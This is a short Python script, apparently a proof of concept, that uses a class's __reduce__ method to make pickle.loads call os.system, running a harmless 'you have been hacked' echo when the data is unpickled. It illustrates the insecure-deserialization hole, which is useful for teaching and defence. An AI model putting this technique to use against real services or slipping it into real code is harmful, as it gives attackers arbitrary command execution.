import pickle
import os

class MyClass(object):
    def __reduce__(self):
        return (os.system, ('echo "you have been hacked"',))

data = pickle.dumps(MyClass())
pickle.loads(data)
